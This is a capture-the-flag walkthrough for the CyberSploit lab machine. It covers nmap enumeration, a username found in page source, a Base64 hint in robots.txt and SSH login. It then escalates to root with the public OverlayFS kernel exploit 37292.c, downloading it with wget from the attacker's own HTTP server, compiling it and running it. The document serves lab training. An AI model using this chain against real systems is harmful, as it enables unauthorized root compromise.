## 1. Network Enumeration

First, I checked my Kali machine's IP address:

```bash
ifconfig
nmap -sn 192.168.56.0/24
```

Then I scanned the target to identify open ports and service versions:

```bash
nmap 192.168.56.116 -p- -sV
```

The scan showed:

```text
22/tcp  open  ssh
80/tcp  open  http
```

This indicated that SSH and a web server were running.

---

## 2. Web Enumeration

I entered the target IP in the browser:

```text
http://192.168.56.116/
```

I first explored the webpage manually by clicking available links and checking the content.

Then I viewed the page source:

```text
Right Click → View Page Source
```

While examining the source, I found the username:

```text
itsskv
```

### Directory Enumeration

I used DIRB to find hidden directories/files:

```bash
dirb http://192.168.56.116/
```

This revealed:

```text
/robots.txt
```

I opened:

```text
http://192.168.56.116/robots.txt
```

There I found a Base64-encoded string.

---

## 3. Decode the Password

I decoded the string using:

```bash
echo "R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9" | base64 -d
```

The `-d` option means **decode**.

The decoded content revealed:

```text
Flag1: cybersploit{youtube.com/c/cybersploit}
```

I used the discovered information to authenticate through SSH.

---

## 4. SSH Access

I connected to the target using the username found in the page source:

```bash
ssh itsskv@192.168.56.116
```

After logging in, I listed the files:

```bash
ls
```

This revealed another flag:

```text
Flag2: cybersploit{https://t.me/cybersploit1}
```

I then checked my current privileges:

```bash
whoami
```

The account was:

```text
itsskv
```

---

## 5. Privilege Enumeration

I checked whether the account could execute commands using `sudo`:

```bash
sudo -l
```

The account did not have useful sudo permissions, so I could not use a direct sudo privilege-escalation technique.

Therefore, I moved on to **kernel enumeration**.

---

## 6. Kernel Enumeration

I checked the kernel version:

```bash
uname -a
```

The result was:

```text
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

The kernel version was:

```text
3.13.0-32-generic
```

I researched this version for known local privilege-escalation vulnerabilities and identified an **OverlayFS** vulnerability.

---

## 7. Search for the Exploit

I searched my local Exploit-DB database:

```bash
searchsploit overlayfs
```

One relevant result was:

```text
Linux Kernel 3.13.0 < 3.19 - 'Overlayfs' Local Privilege Escalation
linux/local/37292.c
```

I copied the exploit to my Kali machine:

```bash
searchsploit -m linux/local/37292.c
```

---

## 8. Transfer the Exploit

I started a Python HTTP server on Kali:

```bash
python -m http.server 80
```

Then, from the target machine, I downloaded the exploit:


```bash
wget http://<kali ip>:80/<filename>
wget http://192.168.56.102:80/37292.c
```

Here, `192.168.56.102` is the IP address of my Kali machine.

I checked that the file was successfully transferred:

```bash
ls
```

The file `37292.c` was present.

---

## 9. Compile the Exploit

I compiled the C source code:

```bash
gcc ./37292.c
```

This generated the default executable:

```text
a.out
```

I then executed it:

```bash
./a.out
```

The exploit successfully provided a root shell.

---

## 10. Verify Root Access

I verified the current user:

```bash
whoami
```

The result was:

```text
root
```

I then accessed the root user's directory:

```bash
cd /root
ls
```

I found:

```text
finalflag.txt
```

I displayed the contents:

```bash
cat finalflag.txt
```

![[Pasted image 20260818124139.png]]

This revealed the final flag:

```text
# cd /root
# ls
finalflag.txt
# cat finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
# 

```

---

# Flags

```text
Flag 1: cybersploit{youtube.com/c/cybersploit}

Flag 2: cybersploit{https://t.me/cybersploit1}

Flag 3: cybersploit{Z3X21CW42C4}
```

# Attack Path

```text
ifconfig
    ↓
Nmap
    ↓
22 SSH + 80 HTTP
    ↓
Web Enumeration
    ↓
View Source → Username: itsskv
    ↓
DIRB → robots.txt
    ↓
Base64 Decode → Flag 1 / Password
    ↓
SSH Login
    ↓
Flag 2
    ↓
whoami + sudo -l
    ↓
No useful sudo privileges
    ↓
uname -a
    ↓
Identify vulnerable kernel
    ↓
SearchSploit → OverlayFS
    ↓
37292.c
    ↓
Transfer using Python HTTP Server + wget
    ↓
Compile with gcc
    ↓
./a.out
    ↓
Root Shell
    ↓
/root/finalflag.txt
    ↓
Flag 3
```

## Key Learning Points

- `nmap` was used to identify the attack surface.
    
- Page-source analysis revealed a username.
    
- `dirb` helped discover `robots.txt`.
    
- Base64 decoding revealed useful information.
    
- `sudo -l` showed that direct sudo escalation was not available.
    
- `uname -a` revealed the vulnerable kernel version.
    
- `searchsploit` was used to locate a matching public exploit.
    
- Python HTTP Server and `wget` were used to transfer the exploit.
    
- `gcc` compiled the C exploit.
    
- Successful exploitation resulted in root access.